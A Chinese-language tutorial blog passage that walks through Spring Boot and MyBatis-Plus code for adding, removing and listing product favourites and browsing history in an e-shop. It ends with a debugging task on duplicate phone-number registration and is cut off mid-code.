class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/collect&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductCollectController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ProductRelationService productRelationService;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="功能编码">功能编码</h2><h3 id="1-商品添加收藏">1. 商品添加收藏</h3><p>前端发过来的请求(使用的是post方式)：<code>http://localhost:8008/api/collect/add</code></p><p><img src="https://img.777nx.cn/test/image-20230329114943308.png" alt="image-20230329114943308"></p><p>看报错<code>Request method 'POST' not supported</code>，不支持请求方法“POST”</p><p>开始编写controller层的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> param body部分，需要查询的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是否成功：成功 true，失败 false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/add&quot;)</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;Boolean&gt; <span class="title function_">addProductCollect</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> StoreProductRelationQueryParam param)</span>&#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    <span class="keyword">if</span> (!NumberUtil.isNumber(param.getId()))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;参数非法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    productRelationService.addProductCollect(Long.valueOf(param.getId()), uid, param.getCategory());</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部分注解说明：</p><ul><li>@NoRepeatSubmit：防止重复提交自定义注解</li><li>@AuthCheck：自定义注解实现用户行为认证</li><li>@Validated：参数验证注解</li></ul><h4 id="1-1-是否收藏">1.1 是否收藏</h4><p>service接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Boolean <span class="title function_">isProductRelation</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isProductCollect</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid)</span> &#123;</span><br><span class="line">    LambdaQueryWrapper&lt;StoreProductRelation&gt; lqw = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    lqw.eq(StoreProductRelation::getProductId, productId)</span><br><span class="line">            .eq(StoreProductRelation::getUid, uid)</span><br><span class="line">            .eq(StoreProductRelation::getType, <span class="string">&quot;collect&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> productRelationMapper.selectCount(lqw);</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-添加收藏">1.2 添加收藏</h4><p>service接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> category</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addProductCollect</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid, String category)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> category</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addProductCollect</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid, String category)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isProductCollect(productId, uid))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;已收藏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">StoreProductRelation</span> <span class="variable">storeProductRelation</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StoreProductRelation</span>();</span><br><span class="line">    storeProductRelation.setProductId(productId);</span><br><span class="line">    storeProductRelation.setUid(uid);</span><br><span class="line">    storeProductRelation.setType(category);</span><br><span class="line">    productRelationMapper.insert(storeProductRelation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-商品取消收藏">2. 商品取消收藏</h3><p>前端发过来的请求(使用的是post方式)：<code>http://localhost:8008/api/collect/del</code></p><p>controller层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取消收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> param body部分，需要查询的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是否成功：成功 true，失败 false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@NoRepeatSubmit</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/del&quot;)</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;Boolean&gt; <span class="title function_">delProductCollect</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> StoreProductRelationQueryParam param)</span>&#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    <span class="keyword">if</span> (!NumberUtil.isNumber(param.getId()))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;参数非法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    productRelationService.delProductCollect(Long.valueOf(param.getId()), uid, param.getCategory());</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取消收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> category</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">delProductCollect</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid, String category)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取消收藏</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid       用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> category</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delProductCollect</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid, String category)</span> &#123;</span><br><span class="line">    LambdaQueryWrapper&lt;StoreProductRelation&gt; lqw = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    lqw.eq(StoreProductRelation::getProductId, productId)</span><br><span class="line">            .eq(StoreProductRelation::getUid, uid)</span><br><span class="line">            .eq(StoreProductRelation::getType, category);</span><br><span class="line">    <span class="type">StoreProductRelation</span> <span class="variable">productRelation</span> <span class="operator">=</span> productRelationMapper.selectOne(lqw);</span><br><span class="line">    <span class="keyword">if</span> (productRelation == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;已取消&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.removeById(productRelation.getId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-批量删除收藏-足迹">3. 批量删除收藏/足迹</h3><p>前端发过来的请求(使用的是post方式)：<code>http://localhost:8008/api/collect/dels/&#123;productIds&#125;</code></p><p>controller层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 批量删除收藏/足迹 collect收藏 foot 足迹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productIds 商品Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> param body部分，需要查询的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是否成功：成功 true，失败 false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@NoRepeatSubmit</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/dels/&#123;productIds&#125;&quot;)</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;Boolean&gt; <span class="title function_">delCollects</span><span class="params">(<span class="meta">@PathVariable</span> String productIds,<span class="meta">@RequestBody</span> StoreProductRelationQueryParam param)</span> &#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    String[] ids = productIds.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ids.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (String id : ids) &#123;</span><br><span class="line">            productRelationService.delProductCollect(Long.valueOf(id), uid, param.getCategory());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;参数非法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-获取收藏或足迹">4. 获取收藏或足迹</h3><p>前端发过来的请求(使用的是get方式)：<code>http://localhost:8008/api/collect/user?limit=10&amp;page=1&amp;type=foot</code></p><p>后端接受的请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;List&lt;StoreProductRelationQueryVo&gt;&gt; <span class="title function_">UserCollect</span><span class="params">(<span class="meta">@RequestParam(value = &quot;page&quot;, defaultValue = &quot;1&quot;)</span> <span class="type">int</span> page, <span class="meta">@RequestParam(value = &quot;limit&quot;, defaultValue = &quot;10&quot;)</span> <span class="type">int</span> limit, <span class="meta">@RequestParam(value = &quot;type&quot;)</span> String type)</span> &#123;</span><br><span class="line">    log.info(<span class="string">&quot;limit: &#123;&#125;&quot;</span>, limit);</span><br><span class="line">    log.info(<span class="string">&quot;page: &#123;&#125;&quot;</span>, page);</span><br><span class="line">    log.info(<span class="string">&quot;type: &#123;&#125;&quot;</span>, type);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现可以接收到前端参数后，开始补全<code>controller</code>层代码，添加下面的接口代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用户收藏列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page 页码,默认为 1</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> limit 页大小,默认为 10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type foot为足迹，collect为收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;List&lt;StoreProductRelationQueryVo&gt;&gt; <span class="title function_">UserCollect</span><span class="params">(<span class="meta">@RequestParam(value = &quot;page&quot;, defaultValue = &quot;1&quot;)</span> <span class="type">int</span> page, <span class="meta">@RequestParam(value = &quot;limit&quot;, defaultValue = &quot;10&quot;)</span> <span class="type">int</span> limit, <span class="meta">@RequestParam(value = &quot;type&quot;)</span> String type)</span> &#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    List&lt;StoreProductRelationQueryVo&gt; storeProductRelationQueryVos = productRelationService.userProductCollect(page, limit, uid, type);</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok(storeProductRelationQueryVos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们发现API文档要返回的数据并不能够满足我们的需求</p><p><img src="https://img.777nx.cn/test/image-20230330225306494.png" alt="image-20230330225306494"></p><p>通过分析返回的数据是来自<code>store_product_relation</code>和<code>store_product</code>两张表的字段，因此需要在<code>vo</code>包下造个<code>StoreProductRelationQueryVo</code>的类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.vo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.eshop.serializer.DoubleSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.annotation.JsonSerialize;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StoreProductRelationQueryVo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Long</span> <span class="variable">serialVersion</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> Long uid;</span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line">    <span class="keyword">private</span> String type;</span><br><span class="line">    <span class="keyword">private</span> String category;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="keyword">private</span> Long pid;</span><br><span class="line">    <span class="keyword">private</span> String image;</span><br><span class="line">    <span class="keyword">private</span> String storeName;</span><br><span class="line">    <span class="keyword">private</span> Double price;</span><br><span class="line">    <span class="meta">@JsonSerialize(using = DoubleSerializer.class)</span></span><br><span class="line">    <span class="keyword">private</span> Double otPrice;</span><br><span class="line">    <span class="keyword">private</span> Integer sales;</span><br><span class="line">    <span class="keyword">private</span> Integer isShow;</span><br><span class="line">    <span class="keyword">private</span> Integer isIntegral;</span><br><span class="line">    <span class="keyword">private</span> Integer integer;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/image-20230330225930287.png" alt="image-20230330225930287"></p><p><img src="https://img.777nx.cn/test/image-20230330230551222.png" alt="image-20230330230551222"></p><p>service层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用户收藏列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> limit 页大小</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page 页码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type foot为足迹 collect为收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">List&lt;StoreProductRelationQueryVo&gt; <span class="title function_">userProductCollect</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> limit, Long uid, String type)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用户收藏列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> limit 页大小</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page 页码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type foot为足迹 collect为收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;StoreProductRelationQueryVo&gt; <span class="title function_">userProductCollect</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> limit, Long uid, String type)</span> &#123;</span><br><span class="line">    <span class="comment">// IPage&lt;StoreProductRelation&gt; pageModel = new Page&lt;&gt;(page, limit);</span></span><br><span class="line">    Page&lt;StoreProductRelation&gt; pageModel = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page, limit);</span><br><span class="line">    List&lt;StoreProductRelationQueryVo&gt; list = productRelationMapper.selectRelationList(pageModel, uid, type);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里不能够用<code>mybatis-plus的分页插件</code>，控制台会报<code>Handler dispatch failed; nested exception is java.lang.NoSuchMethodError</code>的错误，我推测的sql语句的问题</p></blockquote><p>因为该业务涉及到多表查询，<code>mybatisplus</code>并未给我们提供相关可以调用的接口，所以我们需要自己编写sql语句，去实现我们的需求。sql语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select B.id pid,A.type as category,B.store_name as storeName,B.price,B.is_integral as isIntegral, B.ot_price as otPrice,B.sales,B.image,B.is_show as isShow,B.integral as integral from store_product_relation A left join store_product B on A.product_id = B.id where A.type=&#x27;foot&#x27; and A.uid=1 and A.is_del = 0 and B.is_del = 0 order by A.create_time desc</span><br></pre></td></tr></table></figure><p>mapper层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select B.id pid,A.type as category,B.store_name as storeName,B.price,B.is_integral as isIntegral,&quot; +</span></span><br><span class="line"><span class="meta">        &quot;B.ot_price as otPrice,B.sales,B.image,B.is_show as isShow,B.integral as integral&quot; +</span></span><br><span class="line"><span class="meta">        &quot; from store_product_relation A left join store_product B &quot; +</span></span><br><span class="line"><span class="meta">        &quot;on A.product_id = B.id where A.type=#&#123;type&#125; and A.uid=#&#123;uid&#125; and A.is_del = 0 and B.is_del = 0 order by A.create_time desc&quot;)</span></span><br><span class="line">List&lt;StoreProductRelationQueryVo&gt; <span class="title function_">selectRelationList</span><span class="params">(Page page, <span class="meta">@Param(&quot;uid&quot;)</span> Long uid, <span class="meta">@Param(&quot;type&quot;)</span> String type)</span>;</span><br></pre></td></tr></table></figure><p>至此功能编码完毕！！</p><h2 id="程序排错">程序排错</h2><h3 id="任务描述">任务描述</h3><p>接口地址<code>/api/register</code>输入相同的手机号注册新用户时，页面显示了SQL错误。正常情况应该显示该手机号已存在。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r\n### Error updating database.  Cause: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry &#x27;13512345678&#x27; for key &#x27;username&#x27;\r\n### The error may exist in com/eshop/modules/user/service/mapper/UserMapper.java (best guess)\r\n### The error may involve com.eshop.modules.user.service.mapper.UserMapper.insert-Inline\r\n### The error occurred while setting parameters\r\n### SQL: INSERT INTO eshop_user  ( username, password,       nickname, avatar, phone, add_ip, last_ip,         user_type,        create_time,  is_del )  VALUES  ( ?, ?,       ?, ?, ?, ?, ?,         ?,        ?,  ? )\r\n### Cause: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry &#x27;13512345678&#x27; for key &#x27;username&#x27;\n; Duplicate entry &#x27;13512345678&#x27; for key &#x27;username&#x27;; nested exception is java.sql.SQLIntegrityConstraintViolationException: Duplicate entry &#x27;13512345678&#x27; for key &#x27;username&#x27;</span><br></pre></td></tr></table></figure><h3 id="要求">要求</h3><p>修改完代码之后，相同手机号注册时应提示手机号已存在。</p><h3 id="代码编写">代码编写</h3><p>对该接口代码进行分析，发现并未对获得<code>shopUser</code>的对象做判断是否为空对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/register&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;H5/APP注册新用户&quot;, notes = &quot;H5/APP注册新用户&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;String&gt; <span class="title function_">register</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> RegParam param)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">codeObj</span> <span class="operator">=</span> redisUtil.get(<span class="string">&quot;code_&quot;</span> + param.getAccount());</span><br><span class="line">    <span class="keyword">if</span>(codeObj == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ApiResult.fail(<span class="string">&quot;请先获取验证码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> codeObj.toString();</span><br><span class="line">    <span class="keyword">if</span> (!StrUtil.equals(code, param.getCaptcha())) &#123;</span><br><span class="line">        <span class="keyword">return</span> ApiResult.fail(<span class="string">&quot;验证码错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ShopUser</span> <span class="variable">shopUser</span> <span class="operator">=</span> userService.getOne(Wrappers.&lt;ShopUser&gt;lambdaQuery()</span><br><span class="line">            